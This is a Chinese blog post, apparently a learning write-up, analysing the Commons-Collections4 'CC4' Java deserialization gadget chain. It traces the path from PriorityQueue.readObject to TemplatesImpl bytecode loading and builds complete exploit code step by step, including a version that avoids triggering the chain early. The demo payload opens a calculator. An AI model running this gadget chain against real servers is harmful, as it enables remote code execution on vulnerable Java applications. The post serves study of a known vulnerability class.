---
title: java反序列化之CC4
date: 2026-05-17
tags: 
  - java安全
  - 反序列化专题
  - CC链
categories: 
  - web安全
  - java安全
excerpt: java反序列化之CC4
---

# java反序列化之CC4

## CC4 链分析

CC 链的漏洞一般都和`transform`方法分不开。

我们前面学习的 CC1、CC6、CC3，命令执行的方法就两种，为反射或动态加载字节码。而 CC4 链中如果`Commons-Collections4`的版本在 4.1， `InvokerTransformer`类不再继承`Serializable`接口了，无法序列化。

既然`InvokerTransformer`用不了，我们就去看看谁能替代它。这里使用的是`InstantiateTransformer`，它的`transform`方法中反射调用了构造器，接下来看看谁调用了`transform()`。

在`TransformingComparator`类的`compare()`方法中调用了`transform()`方法，而这个方法也很常见。

TransformingComparator#compare()：

```java
public int compare(final I obj1, final I obj2) {
        final O value1 = this.transformer.transform(obj1);
        final O value2 = this.transformer.transform(obj2);
        return this.decorated.compare(value1, value2);
    }
```

这个链子就和之前的3条不同了。接着往前找，在`java.util.PriorityQueue`这个类中的`siftDownUsingComparator`方法中调用了`compare()`方法：

```java
private void siftDownUsingComparator(int k, E x) {
        int half = size >>> 1;
        while (k < half) {
            int child = (k << 1) + 1;
            Object c = queue[child];
            int right = child + 1;
            if (right < size &&
                comparator.compare((E) c, (E) queue[right]) > 0)
                c = queue[child = right];
            if (comparator.compare(x, (E) c) <= 0)
                break;
            queue[k] = c;
            k = child;
        }
        queue[k] = x;
    }
```

接着往上找，在这个类的`siftDown`中调用了`siftDownUsingComparator`：

```java
private void siftDown(int k, E x) {
        if (comparator != null)
            siftDownUsingComparator(k, x);
        else
            siftDownComparable(k, x);
    }
```

在这个类的`heapify`方法中调用了`siftDown`方法：

```java
private void heapify() {
        for (int i = (size >>> 1) - 1; i >= 0; i--)
            siftDown(i, (E) queue[i]);
    }
```

再往上找，还是这个类，在`readObject`方法中调用了`heapify()`方法：

```java
private void readObject(java.io.ObjectInputStream s)
        throws java.io.IOException, ClassNotFoundException {
        // Read in size, and any hidden stuff
        s.defaultReadObject();

        // Read in (and discard) array length
        s.readInt();

        queue = new Object[size];

        // Read in all elements.
        for (int i = 0; i < size; i++)
            queue[i] = s.readObject();

        // Elements are guaranteed to be in "proper order", but the
        // spec has never explained what that might be.
        heapify();
    }
```

到这，利用链就找完了，接下来就是逐步满足条件的过程。

## 逐步编写 EXP

### 初步编写

```java
package org.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections4.functors.InstantiateTransformer;

import javax.xml.transform.Templates;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;

public class test {
    public static void main(String[] args) throws Exception{

        TemplatesImpl templates = new TemplatesImpl();

        Class<? extends TemplatesImpl> templatesClass = templates.getClass();
        Field name = templatesClass.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(templates,"abc");

        Field bytecodes = templatesClass.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        byte[] evil = Files.readAllBytes(Paths.get("C:\\Users\\32202\\Desktop\\CC4\\target\\classes\\org\\example\\calcexp\\Calc.class"));
        byte[][] codes={evil};
        bytecodes.set(templates,codes);

        Field tfactory = templatesClass.getDeclaredField("_tfactory");
        tfactory.setAccessible(true);
        tfactory.set(templates,new TransformerFactoryImpl());

        InstantiateTransformer<Object> instantiateTransformer = new InstantiateTransformer<>(new Class[]{Templates.class}, new Object[]{templates});
        instantiateTransformer.transform(TrAXFilter.class);
    }
}
```

成功弹出计算器，接下是把`TransformingComparator`类的`compare()`方法放进去。这个类是可序列化的，所以我们也许可以通过反射来修改其调用`compare()`方法的值。

这里`compare()`要求两个参数，但是并不能达到弹计算器的效果，所以我们尝试在下一步的`PriorityQueue.siftUpUsingComparator()`来实现弹计算器。

```java
package org.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;

import javax.xml.transform.Templates;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.PriorityQueue;

public class test {

    public static void serialize(Object obj) throws Exception{
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static void unserialize(String filename) throws Exception{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
        ois.readObject();
    }

    public static void main(String[] args) throws Exception{

        TemplatesImpl templates = new TemplatesImpl();

        Class<? extends TemplatesImpl> templatesClass = templates.getClass();
        Field name = templatesClass.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(templates,"abc");

        Field bytecodes = templatesClass.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        byte[] evil = Files.readAllBytes(Paths.get("C:\\Users\\32202\\Desktop\\CC4\\target\\classes\\org\\example\\calcexp\\Calc.class"));
        byte[][] codes={evil};
        bytecodes.set(templates,codes);

        Field tfactory = templatesClass.getDeclaredField("_tfactory");
        tfactory.setAccessible(true);
        tfactory.set(templates,new TransformerFactoryImpl());

        InstantiateTransformer<Object> instantiateTransformer = new InstantiateTransformer<>(new Class[]{Templates.class}, new Object[]{templates});
        //instantiateTransformer.transform(TrAXFilter.class);

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                instantiateTransformer
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        TransformingComparator transformingComparator = new TransformingComparator<>(chainedTransformer);
        PriorityQueue priorityQueue = new PriorityQueue<>(transformingComparator);

        serialize(priorityQueue);
        unserialize("ser.bin");
    }
}
```

但是这并没有弹出计算器，也没有抛异常。这应该是因为中间某个步骤直接退出程序了。

打断点调试后发现是在`heapify()`方法中跳出程序：

```java
private void heapify() {
        for (int i = (size >>> 1) - 1; i >= 0; i--)
            siftDown(i, (E) queue[i]);
    }
```

因为这里有一个`size >>> 1`，`>>>`是移位运算符，指定移位的位数。

这里我们需要把`size`的值进行替换，当`size`为1时才算成功；当`size`等于2时才能进入循环。

我们先看这个`size`是什么：

```java
    /**
     * The number of elements in the priority queue.
     */
    private int size = 0;
```

从注释可以看出，`size`是这个优先级队列的长度，我们可以当成数组的长度来理解。所以我们添加以下语句即可：

```java
priorityQueue.add(1);  
priorityQueue.add(2);
```

最终的 EXP：
```java
package org.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;

import javax.xml.transform.Templates;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.PriorityQueue;

public class test {

    public static void serialize(Object obj) throws Exception{
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static void unserialize(String filename) throws Exception{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
        ois.readObject();
    }

    public static void main(String[] args) throws Exception{

        TemplatesImpl templates = new TemplatesImpl();

        Class<? extends TemplatesImpl> templatesClass = templates.getClass();
        Field name = templatesClass.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(templates,"abc");

        Field bytecodes = templatesClass.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        byte[] evil = Files.readAllBytes(Paths.get("C:\\Users\\32202\\Desktop\\CC4\\target\\classes\\org\\example\\calcexp\\Calc.class"));
        byte[][] codes={evil};
        bytecodes.set(templates,codes);

        Field tfactory = templatesClass.getDeclaredField("_tfactory");
        tfactory.setAccessible(true);
        tfactory.set(templates,new TransformerFactoryImpl());

        InstantiateTransformer<Object> instantiateTransformer = new InstantiateTransformer<>(new Class[]{Templates.class}, new Object[]{templates});
        //instantiateTransformer.transform(TrAXFilter.class);

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                instantiateTransformer
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        TransformingComparator transformingComparator = new TransformingComparator<>(chainedTransformer);
        PriorityQueue priorityQueue = new PriorityQueue<>(transformingComparator);

        priorityQueue.add(1);
        priorityQueue.add(2);
        
        serialize(priorityQueue);
        unserialize("ser.bin");
    }
}
```

虽然成功弹出计算器，但是还是有报错，接下来解决报错的问题。

### 处理报错

当我们执行`priorityQueue.add(1)`时，在`add()`方法内调用`offer()`方法，`offer()`方法内调用`siftUp`方法，`siftUp()`方法内调用`siftUpUsingComparator`方法，`siftUpUsingComparator()`方法内部调用了`compare()`方法，然后调用`transform()`。

这就说明，还没到序列化和反序列化，代码已经到弹计算器去了,但是由于`_tfactory`为空，所以报错。

因为我们不需要让代码在本地运行，所以我们可以先让`transformingComparator`的值为一个无关的对象，在`add`之后再反射修改回来就好了。

```java
package org.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;

import javax.xml.transform.Templates;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.PriorityQueue;

public class test {

    public static void serialize(Object obj) throws Exception{
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static void unserialize(String filename) throws Exception{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
        ois.readObject();
    }

    public static void main(String[] args) throws Exception{

        TemplatesImpl templates = new TemplatesImpl();

        Class<? extends TemplatesImpl> templatesClass = templates.getClass();
        Field name = templatesClass.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(templates,"abc");

        Field bytecodes = templatesClass.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        byte[] evil = Files.readAllBytes(Paths.get("C:\\Users\\32202\\Desktop\\CC4\\target\\classes\\org\\example\\calcexp\\Calc.class"));
        byte[][] codes={evil};
        bytecodes.set(templates,codes);

        /*Field tfactory = templatesClass.getDeclaredField("_tfactory");
        tfactory.setAccessible(true);
        tfactory.set(templates,new TransformerFactoryImpl());*/

        InstantiateTransformer<Object> instantiateTransformer = new InstantiateTransformer<>(new Class[]{Templates.class}, new Object[]{templates});
        //instantiateTransformer.transform(TrAXFilter.class);

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                instantiateTransformer
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        TransformingComparator transformingComparator = new TransformingComparator<>(new ConstantTransformer<>(1));
        PriorityQueue priorityQueue = new PriorityQueue<>(transformingComparator);

        priorityQueue.add(1);
        priorityQueue.add(2);

        Class<? extends TransformingComparator> c = transformingComparator.getClass();
        Field transformer = c.getDeclaredField("transformer");
        transformer.setAccessible(true);
        transformer.set(transformingComparator,chainedTransformer);

        serialize(priorityQueue);
        unserialize("ser.bin");
    }
}
```

## 总结

其实 CC 链学到这我还是有一点懵的，因为中间有些问题我不太清楚，但是基本的链子我是已经搞明白了，后续就是多练，上手之后相信会好很多。















